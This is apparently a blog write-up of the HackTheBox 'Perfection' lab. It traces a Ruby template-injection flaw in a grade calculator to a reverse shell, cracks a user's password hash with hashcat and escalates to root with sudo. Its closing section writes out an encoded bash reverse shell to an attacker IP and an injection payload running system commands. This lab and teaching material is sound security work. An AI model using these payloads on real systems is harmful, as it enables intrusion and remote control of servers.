+++
title = 'Perfection'
date = 2024-07-19T14:39:25+05:30
slug = "HTB-Perfection"
categories = ["hackthebox","Perfection","linux","Easy"]
+++

Startign with nmap 

![](https://drive.google.com/file/d/1H4Ozzfk26D-TLisbzn6UFx0dPFgK1K85/view?usp=sharing)

![](https://drive.google.com/file/d/1ez-_QjWwQaRnKszcVgHRs2sAZsehdo6l/view?usp=sharing)

the website dashboard

checked the wappalyzer to find the technologies website is using but couldn't find any 
I tried directory fuzzing 

Found this at the bottom of the website 
![](https://drive.google.com/file/d/1XKekjq8RdFUVWDVBGYfmmllhak3FhcRe/view?usp=sharing)

![](https://drive.google.com/file/d/1MQSBNGn20s5IBurU2BIGf9n__0UxAHqm/view?usp=sharing)

![](https://drive.google.com/file/d/1kmmjyqS_v8X98z5TG3JVlXTIT7pgEwYZ/view?usp=sharing)
we got another info that susan is sysadmin 

we can see this in the about us and there might me a vulnerability on secure coding
![](https://drive.google.com/file/d/1Z76wgF1M5i8oS2MdRN6VbODbjrpQj7LC/view?usp=sharing)

there is a input field in the website , there might be a input validation vulnerbility

let's do some rearch on the technologies the website is using WEBrick 
![](https://drive.google.com/file/d/1-tXUY8I75FXBDRBPFqlWvIBM6j8LQ-dX/view?usp=sharing)

but there is no information about vulnerbilities
![](https://drive.google.com/file/d/1LB_SVbYCZBDiPbWU0jh1IrSOu_p1aiqp/view?usp=sharing)


the above is the robots.txt file we got something intresting 

now we've gatherd information available in the website the next part will be testing the inputs

![](https://drive.google.com/file/d/1sKX0n8Mei8CJ1on8M8LUIqjDxRhHSMUy/view?usp=sharing)

i did burpsuite scan to get more information about the vulnerbilities and the results are 

![](https://drive.google.com/file/d/1qQrnqq_but1HKOR30nLu2fpYeXEZpvbt/view?usp=sharing)
to know how to perform a scan in burpsuite refer to [[scanning with burp scanner]]
so i confirmed that there is a way to bypass the input in the calculator

after adding single '  i got this result 
![](https://drive.google.com/file/d/1x2bhQUUHEfDAeznflZPafh1a9cevieHF/view?usp=sharing)

after bit of research i came to know that it is a SSTI vulnerbility (server side template injection)
refer [[SSTI vulnerbility]] 

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

search for ruby payloads in this website

![](https://drive.google.com/file/d/1-ZtkAYblN002JzRTdr6R7m3a7ckMo06q/view?usp=sharing)


let's try some payloads and see what happens
![](https://drive.google.com/file/d/160A-_UkBxBchLVrn80XcHw04rUrvwTgL/view?usp=sharing)

we've got same result let's keep trying
to encode select the characters and do ctrl+u to do url encoding
![](https://drive.google.com/file/d/17llt7hOYwgfPVSZ4yuXhqAK57gWCps5Y/view?usp=sharing)

i've multiplied 7* 7 and i got the result 49 so <%= 7* 7 %> payload works 

now let's add a linux command to thi payload to see if it works 

![](https://drive.google.com/file/d/1GMW_MAqGN427M-ty4bhGxprw-tyHZ9eM/view?usp=sharing)

we got susan as the username if we used whoami comamnd here

let's do ls and pwd to knwo the direcotries and present directory
to execute commands use  ` 'these 

![](https://drive.google.com/file/d/1XQ1cnnhUm4cdCai6uOakZoXJy-qANF4Z/view?usp=sharing)

we got some details

using revshells.com website i created a python payload and gave me shell access

![](https://drive.google.com/file/d/1SP6G7-nj29HlUBLMC2SOklAtJXEDgwA6/view?usp=sharing)

We can generate payload manually on our terminal refer to [[#Generate Payload]]

![](https://drive.google.com/file/d/1ffKj5C1p6-Yn_t5LESaAf5bjsmpBc8FN/view?usp=sharing)

to get neat terminal we did 
python3 -c 'import pty; pty.spawn("/bin/bash")'


we got the user flag now

![](https://drive.google.com/file/d/1yh68VzvzWqCARt5L8-ADB7WwLa9zp1XY/view?usp=sharing)

![](https://drive.google.com/file/d/1vlVdKldSKOXtIdvFbX6e4TOfrV_G5FE6/view?usp=sharing)

cracking password with hash cat  using this command
```
hashcat -m 1400 <hashhere> -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d
```

![](https://drive.google.com/file/d/18F1U5iRRsMdEvrCHxNgdXrRZ4-FSGC89/view?usp=sharing)

refer [[Hashcat]] to learn using hashacat

after sometime we finally cracked hashcat password 
susan_nasus_413759210

![](https://drive.google.com/file/d/1owRoHi7T1qepla3ZahOU2Hx3_C-FgzFE/view?usp=sharing)


using sudo bash we switched to root user and got root flag
![](https://drive.google.com/file/d/17dVn3vNQeRGEPc67Zs_rm5Jp_w0xzUCF/view?usp=sharing)


### Generate Payload

Using hURL to encode and decode payloads demonstrates how we can mess around with data to take advantage of weaknesses in web applications.

Specifically, the payload we’re making for the Weighted Grade Calculator app is made to run a reverse shell command. This way, we can exploit any possible vulnerabilities that let us run code on the server’s side.

```
┌──(kali㉿kali)-[~]
└─$ hURL -B "bash -i >& /dev/tcp/10.10.14.213/7373 0>&1"

Original       :: bash -i >& /dev/tcp/10.10.14.213/7373 0>&1                                                                                                                                                     
base64 ENcoded :: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx

┌──(kali㉿kali)-[~]
└─$ hURL -U "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx"

Original    :: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx                                                                                                                                          
URL ENcoded :: YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx
```

```
category1=a%0A<%25%3Dsystem("ping+-c1+$myIP");%25>
```
the above is the another paylaod from the write up 
